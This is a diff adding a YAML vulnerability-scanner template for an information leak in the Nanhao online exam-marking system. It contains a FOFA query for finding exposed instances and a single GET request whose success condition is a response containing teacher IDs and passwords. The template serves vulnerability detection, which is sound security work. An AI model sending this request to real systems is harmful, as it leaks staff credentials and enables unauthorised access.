@@ -1,0 +1,15 @@
+id: poc-yaml-nanhao-oms-logname-info-leak
+info:
+  name: 南昊网上阅卷系统 logname 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 南昊网上阅卷系统
+  fofa: app="南昊网上阅卷系统"
+requests:
+- method: GET
+  path: /exam/monitor/index.jsp?logname=admin
+  expression: status_code == 200 && contains(body,"admin") && contains(gbk_decode(body),"教师ID")
+    && contains(gbk_decode(body),"教师密码") && contains(gbk_decode(body),"是否在线")
+variables: {}
+transport: http
